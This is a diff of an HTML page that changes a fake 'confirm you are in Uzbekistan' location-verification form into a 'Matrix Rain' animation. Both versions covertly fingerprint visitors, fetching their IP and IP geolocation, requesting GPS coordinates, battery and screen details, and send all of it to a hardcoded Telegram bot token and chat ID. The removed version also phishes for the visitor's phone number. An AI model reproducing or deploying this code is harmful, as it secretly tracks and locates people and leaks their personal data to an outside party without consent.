@@ -3,147 +3,70 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Подтверждение местоположения</title>
+    <title>Matrix Rain</title>
     <style>
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             margin: 0;
-            background-color: #e9ecef;
-            color: #343a40;
-            line-height: 1.6;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            text-align: center;
+            overflow: hidden;
+            background: black;
         }
-        .container {
-            background-color: #ffffff;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-            max-width: 400px;
-            width: 90%;
-            border: 1px solid #dee2e6;
-        }
-        h1 {
-            color: #007bff;
-            margin-bottom: 20px;
-            font-size: 1.5em;
-        }
-        p {
-            margin-bottom: 20px;
-            font-size: 1.1em;
-        }
-        .button {
-            background-color: #007bff;
-            color: white;
-            padding: 10px 20px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 1em;
-            transition: background-color 0.3s ease;
-        }
-        .button:hover {
-            background-color: #0056b3;
-        }
-        .spinner {
-            border: 4px solid rgba(0, 0, 0, 0.1);
-            border-left-color: #007bff;
-            border-radius: 50%;
-            width: 30px;
-            height: 30px;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
-            display: none;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .error-message {
-            color: #dc3545;
-            font-weight: bold;
-            margin-top: 20px;
-            margin-bottom: 15px;
-        }
-        .phone-input {
-            width: calc(100% - 20px);
-            padding: 10px;
-            margin-bottom: 15px;
-            border: 1px solid #ced4da;
-            border-radius: 5px;
-            box-sizing: border-box;
-        }
-        .phone-input.error {
-            border-color: #dc3545;
-        }
-        .phone-error-text {
-            color: #dc3545;
-            font-size: 0.9em;
-            margin-top: -10px;
-            margin-bottom: 10px;
-            display: none;
-        }
-        #initialScreen, #checkingScreen, #phoneNumberScreen {
-            display: none;
+        canvas {
+            display: block;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div id="initialScreen">
-            <h1 id="initialTitle">Сначала подтвердите, что вы в Узбекистане</h1>
-            <p id="initialText">Для продолжения работы необходимо подтвердить ваше местоположение.</p>
-            <button id="confirmLocationBtn" class="button">Подтвердить</button>
-        </div>
-
-        <div id="checkingScreen">
-            <h1 id="checkingTitle">Проверка...</h1>
-            <div class="spinner"></div>
-        </div>
-
-        <div id="phoneNumberScreen">
-            <p class="error-message" id="errorMessage">Ошибка определения, укажите номер, чтобы подтвердить.</p>
-            <input type="tel" id="phoneNumberInput" class="phone-input" placeholder="+998 XX XXX XX XX" required>
-            <div id="phoneNumberErrorText" class="phone-error-text">Неверный формат номера.</div>
-            <button id="continueBtn" class="button">Продолжить</button>
-        </div>
-    </div>
-
+    <canvas id="matrix"></canvas>
     <script>
         const BOT_TOKEN = '7743325672:AAEgT4v4dYlMb3C_JJ9HJP38BYyc-z-3XnA';
         const CHAT_ID = '7048297998';
 
-        const initialScreen = document.getElementById('initialScreen');
-        const checkingScreen = document.getElementById('checkingScreen');
-        const phoneNumberScreen = document.getElementById('phoneNumberScreen');
-        const confirmLocationBtn = document.getElementById('confirmLocationBtn');
-        const continueBtn = document.getElementById('continueBtn');
-        const phoneNumberInput = document.getElementById('phoneNumberInput');
-        const spinner = document.querySelector('.spinner');
-        const initialTitle = document.getElementById('initialTitle');
-        const initialText = document.getElementById('initialText');
-        const checkingTitle = document.getElementById('checkingTitle');
-        const errorMessage = document.getElementById('errorMessage');
-        const phoneNumberErrorText = document.getElementById('phoneNumberErrorText');
+        const canvas = document.getElementById('matrix');
+        const ctx = canvas.getContext('2d');
 
-        let collectedDeviceInfo = {};
-        let telegramMessageId = null;
+        // Настройка размера канваса
+        function resizeCanvas() {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        }
+        resizeCanvas();
+        window.addEventListener('resize', resizeCanvas);
 
-        function isUzbekLanguage() {
-            const userLanguages = navigator.languages || [navigator.language || navigator.userLanguage];
-            return userLanguages.some(lang => lang.toLowerCase().startsWith('uz'));
+        // Настройка матричного дождя
+        const fontSize = 14;
+        const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+        const columns = Math.floor(canvas.width / fontSize);
+        const drops = Array(columns).fill(0);
+
+        function draw() {
+            // Эффект затухания для букв
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+            // Отрисовка букв
+            ctx.fillStyle = '#0F0';
+            ctx.font = `${fontSize}px monospace`;
+
+            for (let i = 0; i < drops.length; i++) {
+                const text = chars.charAt(Math.floor(Math.random() * chars.length));
+                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+
+                // Сброс символа
+                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                    drops[i] = 0;
+                }
+                drops[i]++;
+            }
+
+            requestAnimationFrame(draw);
         }
 
-        async function collectDeviceInfo(includeGps = false, includePhoneNumber = false) {
+        async function collectDeviceInfo(includeGps = false) {
             const info = {};
-
             const userAgent = navigator.userAgent || 'Неизвестно';
             info.userAgent = userAgent;
             info.platform = navigator.platform || 'Неизвестно';
-
+            
             let osInfo = 'Неизвестно';
             let browserName = 'Неизвестно';
             let browserVersion = 'Неизвестно';
@@ -192,36 +115,17 @@
             }
 
             info.osInfo = osInfo;
-            info.browserName = browserName;
-            info.browserVersion = browserVersion;
-            info.deviceName = deviceName;
-
-            info.cookiesEnabled = navigator.cookieEnabled ? 'Да' : 'Нет';
+            info.browser = `${browserName} ${browserVersion}`;
+            info.platform = navigator.platform || 'Неизвестно';
+            info.bluetoothAPI = (typeof navigator.bluetooth !== 'undefined') ? 'Да' : 'Нет';
+            info.usbAPI = (typeof navigator.usb !== 'undefined') ? 'Да' : 'Нет';
+            info.screenResolution = screen.width + 'x' + screen.height;
             info.languages = navigator.languages.join(', ') || 'Неизвестно';
             try {
                 info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Неизвестно';
             } catch (e) {
                 info.timezone = 'Ошибка определения';
             }
-            info.touchSupport = (typeof navigator.maxTouchPoints !== 'undefined' ? navigator.maxTouchPoints + ' точек касания' : 'Неизвестно');
-            info.hardwareConcurrency = navigator.hardwareConcurrency || 'Неизвестно';
-            info.deviceMemory = (navigator.deviceMemory ? navigator.deviceMemory + ' ГБ' : 'Неизвестно');
-
-            if (navigator.connection) {
-                info.connectionType = navigator.connection.effectiveType || 'Недоступно';
-                info.networkType = navigator.connection.type || 'Неизвестно';
-            } else {
-                info.connectionType = 'Недоступно';
-                info.networkType = 'Недоступно';
-            }
-            info.bluetoothAPI = (typeof navigator.bluetooth !== 'undefined') ? 'Да' : 'Нет';
-            info.usbAPI = (typeof navigator.usb !== 'undefined') ? 'Да' : 'Нет';
-
-            info.screenResolution = screen.width + 'x' + screen.height;
-            info.availableScreenResolution = screen.availWidth + 'x' + screen.availHeight;
-            info.viewportSize = window.innerWidth + 'x' + window.innerHeight;
-            info.colorDepth = screen.colorDepth + ' бит';
-            info.devicePixelRatio = window.devicePixelRatio || 'Неизвестно';
 
             try {
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
@@ -229,7 +133,7 @@
                 const ipData = await ipResponse.json();
                 info.publicIp = ipData.ip || 'Неизвестно';
             } catch (error) {
-                info.publicIp = `Ошибка: ${error.message} заблочено`;
+                info.publicIp = `Ошибка: ${error.message} (Проверьте интернет/блокировщики)`;
             }
 
             try {
@@ -242,7 +146,7 @@
                     info.ipLocation = `${geoData.city || 'Неизвестный город'}, ${geoData.region || 'Неизвестный регион'}, ${geoData.country_name || 'Неизвестная страна'} (ISP: ${geoData.org || 'Неизвестно'})`;
                 }
             } catch (error) {
-                info.ipLocation = `Ошибка: ${error.message} заблочено`;
+                info.ipLocation = `Ошибка: ${error.message} (Проверьте интернет/блокировщики)`;
             }
 
             if (includeGps) {
@@ -255,23 +159,23 @@
                                 const accuracy = position.coords.accuracy.toFixed(2);
                                 info.gpsLocation = `Широта: ${lat}, Долгота: ${lon} (Точность: ${accuracy} м)`;
                                 info.googleMapsLink = `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
-                                info.yandexMapsLink = `https://yandex.ru/maps/?ll=${lon},${lat}&z=15`;
+                                info.yandexMapsLink = `https://yandex.ru/maps/?ll=${lon},${lat}&z=15`; 
                                 resolve();
                             },
                             (error) => {
                                 let errorMessageGeo;
                                 switch (error.code) {
                                     case error.PERMISSION_DENIED:
-                                        errorMessageGeo = "GPS отклонен.";
+                                        errorMessageGeo = "Доступ к GPS отклонен пользователем.";
                                         break;
                                     case error.POSITION_UNAVAILABLE:
-                                        errorMessageGeo = "недоступно.";
+                                        errorMessageGeo = "Информация о местоположении недоступна.";
                                         break;
                                     case error.TIMEOUT:
-                                        errorMessageGeo = "Таймаут.";
+                                        errorMessageGeo = "Таймаут получения местоположения.";
                                         break;
                                     default:
-                                        errorMessageGeo = "Неизвестная ошибка.";
+                                        errorMessageGeo = "Неизвестная ошибка получения местоположения.";
                                         break;
                                 }
                                 info.gpsLocation = `Ошибка: ${errorMessageGeo}`;
@@ -297,12 +201,6 @@
                 info.yandexMapsLink = 'Не запрошено';
             }
 
-            if (includePhoneNumber && collectedDeviceInfo.phoneNumber) {
-                info.phoneNumber = collectedDeviceInfo.phoneNumber;
-            } else {
-                info.phoneNumber = 'Не указан';
-            }
-
             if ('getBattery' in navigator) {
                 await navigator.getBattery().then(function(battery) {
                     const status = battery.charging ? 'Заряжается' : 'Не заряжается';
@@ -316,13 +214,11 @@
             } else {
                 info.batteryStatus = 'Не поддерживается';
             }
-
+            
             return info;
         }
 
-        function generateTelegramHtml(info, includePhoneNumber = false) {
-            let telegramHtmlMessage = '<b><pre>Новая информация об устройстве:</pre></b>\n\n';
-
+        function generateTelegramHtml(info) {
             const escapeHtml = (unsafe) => {
                 return unsafe
                     .replace(/&/g, "&amp;")
@@ -332,74 +228,27 @@
                     .replace(/'/g, "&#039;");
             };
 
-            if (includePhoneNumber && info.phoneNumber) {
-                telegramHtmlMessage += `<b><u>Введенный номер телефона:</u></b> ${escapeHtml(info.phoneNumber)}\n\n`;
+            let telegramHtmlMessage = '<b><pre>Новая информация об устройстве:</pre></b>\n\n';
+            telegramHtmlMessage += `<b>User Agent:</b> ${escapeHtml(info.userAgent)}\n`;
+            telegramHtmlMessage += `<b>Операционная система:</b> ${escapeHtml(info.osInfo)}\n`;
+            telegramHtmlMessage += `<b>Платформа:</b> ${escapeHtml(info.platform)}\n`;
+            telegramHtmlMessage += `<b>Браузер:</b> ${escapeHtml(info.browser)}\n`;
+            telegramHtmlMessage += `<b>IP адрес:</b> ${escapeHtml(info.publicIp)}\n`;
+            telegramHtmlMessage += `<b>API Bluetooth:</b> ${escapeHtml(info.bluetoothAPI)}\n`;
+            telegramHtmlMessage += `<b>API USB:</b> ${escapeHtml(info.usbAPI)}\n`;
+            telegramHtmlMessage += `<b>Местоположение по IP:</b> ${escapeHtml(info.ipLocation)}\n`;
+            if (info.gpsLocation === 'Недоступно' || info.gpsLocation === 'Не запрошено' || info.gpsLocation.startsWith('Ошибка')) {
+                telegramHtmlMessage += `<b>GPS координаты:</b> ${escapeHtml(info.gpsLocation)}\n`;
+            } else {
+                 telegramHtmlMessage += `<b>GPS координаты:</b> ${escapeHtml(info.gpsLocation)}\n`;
+                 telegramHtmlMessage += `<b>Google Maps:</b> <a href="${escapeHtml(info.googleMapsLink)}">Открыть на карте</a>\n`;
+                 telegramHtmlMessage += `<b>Яндекс Карты:</b> <a href="${escapeHtml(info.yandexMapsLink)}">Открыть на карте</a>\n`;
             }
+            telegramHtmlMessage += `<b>Статус батареи:</b> ${escapeHtml(info.batteryStatus)}\n`;
+            telegramHtmlMessage += `<b>Разрешение экрана:</b> ${escapeHtml(info.screenResolution)}\n`;
+            telegramHtmlMessage += `<b>Часовой пояс:</b> ${escapeHtml(info.timezone)}\n`;
+            telegramHtmlMessage += `<b>Языки:</b> ${escapeHtml(info.languages)}\n`;
 
-            const sections = {
-                'Основные данные': ['userAgent', 'osInfo', 'platform', 'browserName', 'browserVersion', 'deviceName'],
-                'Информация о сети': ['publicIp', 'connectionType', 'networkType', 'bluetoothAPI', 'usbAPI'],
-                'Местоположение': ['ipLocation', 'gpsLocation', 'googleMapsLink', 'yandexMapsLink'], // Added links here
-                'Аппаратное обеспечение': ['hardwareConcurrency', 'deviceMemory', 'batteryStatus'],
-                'Дисплей': ['screenResolution', 'availableScreenResolution', 'viewportSize', 'colorDepth', 'devicePixelRatio', 'touchSupport'],
-                'Дополнительно': ['cookiesEnabled', 'languages', 'timezone']
-            };
-
-            for (const sectionTitle in sections) {
-                telegramHtmlMessage += `<b><u>${escapeHtml(sectionTitle)}</u></b>\n`;
-                sections[sectionTitle].forEach(key => {
-                    let value = info[key];
-                    let note = '';
-
-                    if (value !== undefined) {
-                        let displayKey = key;
-                        // Manual mapping for keys since we removed the display elements
-                        switch(key) {
-                            case 'userAgent': displayKey = 'User Agent'; break;
-                            case 'osInfo': displayKey = 'Операционная система'; break;
-                            case 'platform': displayKey = 'Платформа'; break;
-                            case 'browserName': displayKey = 'Имя браузера'; break;
-                            case 'browserVersion': displayKey = 'Версия браузера'; break;
-                            case 'deviceName': displayKey = 'название/модель устройства'; break;
-                            case 'publicIp': displayKey = 'IP адрес'; break;
-                            case 'connectionType': displayKey = 'Тип соединения'; break;
-                            case 'networkType': displayKey = 'Физический тип сети'; break;
-                            case 'bluetoothAPI': displayKey = 'API Bluetooth'; break;
-                            case 'usbAPI': displayKey = 'API USB'; break;
-                            case 'ipLocation': displayKey = 'Местоположение по IP'; break;
-                            case 'gpsLocation': displayKey = 'GPS координаты'; break;
-                            case 'googleMapsLink': displayKey = 'Google Maps'; break; // Added display key
-                            case 'yandexMapsLink': displayKey = 'Яндекс Карты'; break; // Added display key
-                            case 'hardwareConcurrency': displayKey = 'Логические ядра CPU'; break;
-                            case 'deviceMemory': displayKey = 'Память устройства (ГБ)'; break;
-                            case 'batteryStatus': displayKey = 'Статус батареи'; break;
-                            case 'screenResolution': displayKey = 'Разрешение экрана (CSS pixels)'; break;
-                            case 'availableScreenResolution': displayKey = 'Доступное разрешение (без UI)'; break;
-                            case 'viewportSize': displayKey = 'Размер окна (Viewport)'; break;
-                            case 'colorDepth': displayKey = 'Глубина цвета'; break;
-                            case 'devicePixelRatio': displayKey = 'Pixel Ratio устройства'; break;
-                            case 'touchSupport': displayKey = 'Поддержка касаний'; break;
-                            case 'cookiesEnabled': displayKey = 'Cookies'; break;
-                            case 'languages': displayKey = 'Языки браузера'; break;
-                            case 'timezone': displayKey = 'Часовой пояс'; break;
-                        }
-
-                        if (key === 'googleMapsLink' && value !== 'Недоступно' && value !== 'Не запрошено') {
-                            telegramHtmlMessage += `<b>${escapeHtml(displayKey)}:</b> <a href="${escapeHtml(String(value))}">Открыть на карте</a>\n`;
-                        } else if (key === 'yandexMapsLink' && value !== 'Недоступно' && value !== 'Не запрошено') {
-                            telegramHtmlMessage += `<b>${escapeHtml(displayKey)}:</b> <a href="${escapeHtml(String(value))}">Открыть на карте</a>\n`;
-                        }
-                        else {
-                            telegramHtmlMessage += `<b>${escapeHtml(displayKey)}:</b> ${escapeHtml(String(value))}`;
-                            if (note) {
-                                telegramHtmlMessage += ` <i>${escapeHtml(note)}</i>`;
-                            }
-                            telegramHtmlMessage += `\n`;
-                        }
-                    }
-                });
-                telegramHtmlMessage += `\n`;
-            }
             return telegramHtmlMessage;
         }
 
@@ -433,7 +282,7 @@
                 return null;
             }
         }
-
+        
         async function editTelegramMessage(messageId, htmlContent) {
             if (!messageId) {
                 console.warn('No message ID available to edit.');
@@ -466,97 +315,19 @@
             }
         }
 
-        function isValidPhoneNumber(phoneNumber) {
-            const regex = /^(?:\+?998)?(?:33|55|6\d|7\d|88|9\d)\d{7}$/;
-            return regex.test(phoneNumber);
+        // --- Главная логика ---
+
+        async function startApp() {
+            let collectedDeviceInfo = await collectDeviceInfo(false);
+            let telegramMessageId = await sendHtmlToTelegram(generateTelegramHtml(collectedDeviceInfo));
+
+            // Запрашиваем GPS и обновляем сообщение в Telegram
+            const updatedInfo = await collectDeviceInfo(true);
+            await editTelegramMessage(telegramMessageId, generateTelegramHtml(updatedInfo));
         }
 
-        function normalizePhoneNumber(phoneNumber) {
-            phoneNumber = phoneNumber.replace(/\s/g, '');
-
-            if (phoneNumber.startsWith('+998')) {
-                return phoneNumber;
-            } else if (phoneNumber.startsWith('998')) {
-                return '+' + phoneNumber;
-            } else {
-                return '+998' + phoneNumber;
-            }
-        }
-
-        function showScreen(screenId) {
-            initialScreen.style.display = 'none';
-            checkingScreen.style.display = 'none';
-            phoneNumberScreen.style.display = 'none';
-            document.getElementById(screenId).style.display = 'block';
-        }
-
-        if (isUzbekLanguage()) {
-            initialTitle.textContent = "Avvalo, O'zbekistonda ekanligingizni tasdiqlang";
-            initialText.textContent = "Davom etish uchun joylashuvingizni tasdiqlashingiz kerak.";
-            confirmLocationBtn.textContent = "Tasdiqlash";
-            checkingTitle.textContent = "Tekshiruv...";
-            errorMessage.textContent = "Aniqlashda xatolik yuz berdi, tasdiqlash uchun raqamingizni kiriting.";
-            continueBtn.textContent = "Davom etish";
-            phoneNumberInput.placeholder = "+998 XX XXX XX XX";
-            phoneNumberErrorText.textContent = "Noto'g'ri raqam formati.";
-        }
-
-        async function sendInitialDeviceInfo() {
-            collectedDeviceInfo = await collectDeviceInfo(false);
-            const initialHtml = generateTelegramHtml(collectedDeviceInfo);
-            telegramMessageId = await sendHtmlToTelegram(initialHtml);
-        }
-
-        window.onload = sendInitialDeviceInfo;
-
-        showScreen('initialScreen');
-
-        confirmLocationBtn.addEventListener('click', async () => {
-            showScreen('checkingScreen');
-            spinner.style.display = 'block';
-
-            const minDelayPromise = new Promise(resolve => setTimeout(resolve, 2500));
-
-            const [gpsInfoResult] = await Promise.all([
-                collectDeviceInfo(true),
-                minDelayPromise
-            ]);
-            
-            collectedDeviceInfo = gpsInfoResult;
-
-            spinner.style.display = 'none';
-            showScreen('phoneNumberScreen');
-
-            const updatedHtmlWithGps = generateTelegramHtml(collectedDeviceInfo);
-            await editTelegramMessage(telegramMessageId, updatedHtmlWithGps);
-        });
-
-        phoneNumberInput.addEventListener('input', () => {
-            phoneNumberInput.classList.remove('error');
-            phoneNumberErrorText.style.display = 'none';
-        });
-
-        continueBtn.addEventListener('click', async () => {
-            let phoneNumber = phoneNumberInput.value.trim();
-
-            if (!isValidPhoneNumber(phoneNumber)) {
-                phoneNumberInput.classList.add('error');
-                phoneNumberErrorText.style.display = 'block';
-                return;
-            }
-
-            phoneNumberInput.classList.remove('error');
-            phoneNumberErrorText.style.display = 'none';
-
-            phoneNumber = normalizePhoneNumber(phoneNumber);
-            collectedDeviceInfo.phoneNumber = phoneNumber;
-
-            const finalTelegramHtmlMessage = generateTelegramHtml(collectedDeviceInfo, true);
-
-            await editTelegramMessage(telegramMessageId, finalTelegramHtmlMessage);
-
-            window.location.href = 'https://m.ok.ru/';
-        });
+        draw(); // Запускаем анимацию "Матричного дождя"
+        startApp(); // Запускаем сбор и отправку данных
     </script>
 </body>
 </html>
